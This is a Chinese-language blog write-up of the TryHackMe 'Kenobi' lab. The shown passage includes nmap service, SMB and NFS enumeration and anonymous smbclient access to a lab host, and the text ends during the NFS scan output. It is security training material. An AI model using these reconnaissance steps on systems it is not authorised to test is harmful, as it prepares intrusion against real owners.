<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>TryHackMe -- Kenobi - V4ler1an</title><meta name="Description" content="THM学习训练记录"><meta property="og:title" content="TryHackMe -- Kenobi" />
<meta property="og:description" content="THM学习训练记录" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.v4ler1an.com/2024/01/thm-kenobi/" /><meta property="og:image" content="https://www.v4ler1an.com/2024/01/thm-kenobi/thm.jpeg" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-03T07:57:40+08:00" />
<meta property="article:modified_time" content="2024-01-03T08:59:40+08:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://www.v4ler1an.com/2024/01/thm-kenobi/thm.jpeg" /><meta name="twitter:title" content="TryHackMe -- Kenobi"/>
<meta name="twitter:description" content="THM学习训练记录"/>
<meta name="twitter:site" content="@YaoyaoShaw"/>
<meta name="application-name" content="V4ler1an">
<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2024/01/thm-kenobi/" /><link rel="prev" href="https://www.v4ler1an.com/2024/01/thm-vulnversity/" /><link rel="next" href="https://www.v4ler1an.com/2024/01/thm-steal_mountain/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "TryHackMe -- Kenobi",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-kenobi\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-kenobi\/thm.jpeg",
                            "width":  1300 ,
                            "height":  620 
                        }],"genre": "posts","keywords": "THM","wordcount":  3082 ,
        "url": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-kenobi\/","datePublished": "2024-01-03T07:57:40+08:00","dateModified": "2024-01-03T08:59:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
                "@type": "Person",
                "name": "v4ler1an"
            },"description": "THM学习训练记录"
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="V4ler1an"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/personal_logo.png"
        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
        data-sizes="auto"
        alt="/images/personal_logo.png"
        title="/images/personal_logo.png" />V4ler1an</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 我 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2024/01/thm-kenobi/" selected>简体中文</option></select>
                    </a><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="V4ler1an"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/personal_logo.png"
        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
        data-sizes="auto"
        alt="/images/personal_logo.png"
        title="/images/personal_logo.png" />V4ler1an</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">我</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/2024/01/thm-kenobi/" selected>简体中文</option></select>
                </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">TryHackMe -- Kenobi</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/pentesting/"><i class="far fa-folder fa-fw"></i>Pentesting</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-01-03">2024-01-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3082 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 7 分钟&nbsp;<span id="/2024/01/thm-kenobi/" class="leancloud_visitors" data-flag-title="TryHackMe -- Kenobi">
                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
                    </span>&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/2024/01/thm-kenobi/thm.jpeg"
        data-srcset="/2024/01/thm-kenobi/thm.jpeg, /2024/01/thm-kenobi/thm.jpeg 1.5x, /2024/01/thm-kenobi/thm.jpeg 2x"
        data-sizes="auto"
        alt="/2024/01/thm-kenobi/thm.jpeg"
        title="THM学习训练记录" /></div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#deploy-the-vulneable-machine">Deploy the vulneable machine</a>
      <ul>
        <li><a href="#scan-the-machine-with-nmap-how-many-ports-are-open">Scan the machine with nmap, how many ports are open?</a></li>
      </ul>
    </li>
    <li><a href="#enumerating-samba-for-shares">Enumerating Samba for shares</a>
      <ul>
        <li><a href="#using-the-nmap-command-above-how-many-shares-have-been-found">Using the nmap command above, how many shares have been found?</a></li>
        <li><a href="#once-youre-connected-list-the-files-on-the-share-what-is-the-file-can-you-see">Once you&rsquo;re connected, list the files on the share. What is the file can you see?</a></li>
        <li><a href="#what-port-is-ftp-running-on">What port is FTP running on?</a></li>
        <li><a href="#what-mount-can-we-see">What mount can we see?</a></li>
      </ul>
    </li>
    <li><a href="#gain-initial-access-with-proftpd">Gain initial access with ProFtpd</a>
      <ul>
        <li><a href="#what-is-the-version">What is the version?</a></li>
        <li><a href="#how-many-exploits-are-there-for-the-proftpd-running">How many exploits are there for the ProFTPd running?</a></li>
        <li><a href="#what-is-kenobis-user-flag-homekenobiusertxt">What is Kenobi&rsquo;s user flag (/home/kenobi/user.txt)?</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-with-path-variable-manipulation">Privilege Escalation with Path Variable Manipulation</a>
      <ul>
        <li><a href="#what-file-looks-particularly-out-of-the-ordinary">What file looks particularly out of the ordinary?</a></li>
        <li><a href="#run-the-binary-how-many-options-appear">Run the binary, how many options appear?</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="thm---kenobi">THM - Kenobi</h1>
<h2 id="deploy-the-vulneable-machine">Deploy the vulneable machine</h2>
<h3 id="scan-the-machine-with-nmap-how-many-ports-are-open">Scan the machine with nmap, how many ports are open?</h3>
<p>nmap扫描端口：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/nessus<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ sudo nmap -T4 -sV 10.10.46.200
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> v4ler1an:
</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-05 22:14 EST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> localhost <span class="o">(</span>10.10.46.200<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.46s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">991</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT     STATE    SERVICE     VERSION
</span></span><span class="line"><span class="cl">21/tcp   open     ftp         ProFTPD 1.3.5
</span></span><span class="line"><span class="cl">22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open     http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl">111/tcp  open     rpcbind     2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
</span></span><span class="line"><span class="cl">139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">545/tcp  filtered ekshell
</span></span><span class="line"><span class="cl">636/tcp  filtered ldapssl
</span></span><span class="line"><span class="cl">2049/tcp open     nfs         2-4 <span class="o">(</span>RPC <span class="c1">#100003)</span>
</span></span><span class="line"><span class="cl">Service Info: Host: KENOBI<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 39.25 seconds
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="enumerating-samba-for-shares">Enumerating Samba for shares</h2>
<h3 id="using-the-nmap-command-above-how-many-shares-have-been-found">Using the nmap command above, how many shares have been found?</h3>
<p>使用nmap的针对smb服务的脚本进行扫描：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/nessus<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ sudo nmap -T4 -p445 --script<span class="o">=</span>smb-enum-shares,smb-enum-users 10.10.46.200
</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-05 22:16 EST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> localhost <span class="o">(</span>10.10.46.200<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.53s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE
</span></span><span class="line"><span class="cl">445/tcp open  microsoft-ds
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-enum-shares:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="se">\\</span>10.10.46.200<span class="se">\I</span>PC$:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Type: STYPE_IPC_HIDDEN
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Comment: IPC Service <span class="o">(</span>kenobi server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Users: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Max Users: &lt;unlimited&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Path: C:<span class="se">\t</span>mp
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Anonymous access: READ/WRITE
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Current user access: READ/WRITE
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="se">\\</span>10.10.46.200<span class="se">\a</span>nonymous:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Type: STYPE_DISKTREE
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Comment:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Users: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Max Users: &lt;unlimited&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Path: C:<span class="se">\h</span>ome<span class="se">\k</span>enobi<span class="se">\s</span>hare
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Anonymous access: READ/WRITE
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Current user access: READ/WRITE
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="se">\\</span>10.10.46.200<span class="se">\p</span>rint$:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Type: STYPE_DISKTREE
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Comment: Printer Drivers
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Users: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Max Users: &lt;unlimited&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Path: C:<span class="se">\v</span>ar<span class="se">\l</span>ib<span class="se">\s</span>amba<span class="se">\p</span>rinters
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Anonymous access: &lt;none&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Current user access: &lt;none&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 77.69 seconds
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="once-youre-connected-list-the-files-on-the-share-what-is-the-file-can-you-see">Once you&rsquo;re connected, list the files on the share. What is the file can you see?</h3>
<p>使用smbclient连接anonymous共享目录，密码为空：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ smbclient //10.10.46.200/anonymous
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\v</span>4ler1an<span class="o">]</span>:
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> <span class="nb">help</span>
</span></span><span class="line"><span class="cl">?              allinfo        altname        archive        backup
</span></span><span class="line"><span class="cl">blocksize      cancel         case_sensitive <span class="nb">cd</span>             chmod
</span></span><span class="line"><span class="cl">chown          close          del            deltree        dir
</span></span><span class="line"><span class="cl">du             <span class="nb">echo</span>           <span class="nb">exit</span>           get            getfacl
</span></span><span class="line"><span class="cl">geteas         hardlink       <span class="nb">help</span>           <span class="nb">history</span>        iosize
</span></span><span class="line"><span class="cl">lcd            link           lock           lowercase      ls
</span></span><span class="line"><span class="cl">l              mask           md             mget           mkdir
</span></span><span class="line"><span class="cl">more           mput           newer          notify         open
</span></span><span class="line"><span class="cl">posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir
</span></span><span class="line"><span class="cl">posix_unlink   posix_whoami   print          prompt         put
</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>            q              queue          quit           readlink
</span></span><span class="line"><span class="cl">rd             recurse        reget          rename         reput
</span></span><span class="line"><span class="cl">rm             rmdir          showacls       setea          setmode
</span></span><span class="line"><span class="cl">scopy          stat           symlink        tar            tarmode
</span></span><span class="line"><span class="cl">timeout        translate      unlock         volume         vuid
</span></span><span class="line"><span class="cl">wdel           logon          listconnect    showconnect    tcon
</span></span><span class="line"><span class="cl">tdis           tid            utimes         logoff         ..
</span></span><span class="line"><span class="cl">!
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Wed Sep  <span class="m">4</span> 06:49:09 <span class="m">2019</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Wed Sep  <span class="m">4</span> 06:56:07 <span class="m">2019</span>
</span></span><span class="line"><span class="cl">  log.txt                             N    <span class="m">12237</span>  Wed Sep  <span class="m">4</span> 06:49:09 <span class="m">2019</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="m">9204224</span> blocks of size 1024. <span class="m">6877092</span> blocks available
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="what-port-is-ftp-running-on">What port is FTP running on?</h3>
<p>下载log.txt文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ smbclient //10.10.46.200/anonymous
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\v</span>4ler1an<span class="o">]</span>:
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Wed Sep  <span class="m">4</span> 06:49:09 <span class="m">2019</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Wed Sep  <span class="m">4</span> 06:56:07 <span class="m">2019</span>
</span></span><span class="line"><span class="cl">  log.txt                             N    <span class="m">12237</span>  Wed Sep  <span class="m">4</span> 06:49:09 <span class="m">2019</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="m">9204224</span> blocks of size 1024. <span class="m">6877116</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> get log.txt
</span></span><span class="line"><span class="cl">getting file <span class="se">\l</span>og.txt of size <span class="m">12237</span> as log.txt <span class="o">(</span>7.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 7.2 KiloBytes/sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看该日志文件，可以发现FTP的运行端口：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># This is a basic ProFTPD configuration file (rename it to
</span></span><span class="line"><span class="cl"># &#39;proftpd.conf&#39; for actual use.  It establishes a single server
</span></span><span class="line"><span class="cl"># and a single anonymous login.  It assumes that you have a user/group
</span></span><span class="line"><span class="cl"># &#34;nobody&#34; and &#34;ftp&#34; for normal operation and anon.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ServerName			&#34;ProFTPD Default Installation&#34;
</span></span><span class="line"><span class="cl">ServerType			standalone
</span></span><span class="line"><span class="cl">DefaultServer			on
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Port 21 is the standard FTP port.
</span></span><span class="line"><span class="cl">Port				21
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="what-mount-can-we-see">What mount can we see?</h3>
<p>Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.</p>
<p>In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.</p>
<p>使用nmap脚本扫描：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ sudo nmap -T4 -p111 --script<span class="o">=</span>nfs-ls,nfs-statfs,nfs-showmount 10.10.46.200
</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-05 22:27 EST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> localhost <span class="o">(</span>10.10.46.200<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.47s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE
</span></span><span class="line"><span class="cl">111/tcp open  rpcbind
</span></span><span class="line"><span class="cl"><span class="p">|</span> nfs-showmount:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  /var *
</span></span><span class="line"><span class="cl"><span class="p">|</span> nfs-statfs:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  /var        9204224.0  1836516.0  6877112.0  22%   16.0T        <span class="m">32000</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> nfs-ls: Volume /var
</span></span><span class="line"><span class="cl"><span class="p">|</span>   access: Read Lookup NoModify NoExtend NoDelete NoExecute
</span></span><span class="line"><span class="cl"><span class="p">|</span> PERMISSION  UID  GID  SIZE  TIME                 FILENAME
</span></span><span class="line"><span class="cl"><span class="p">|</span> rwxr-xr-x   <span class="m">0</span>    <span class="m">0</span>    <span class="m">4096</span>  2019-09-04T08:53:24  .
</span></span><span class="line"><span class="cl"><span class="p">|</span> rwxr-xr-x   <span class="m">0</span>    <span class="m">0</span>    <span class="m">4096</span>  2019-09-04T12:27:33  ..
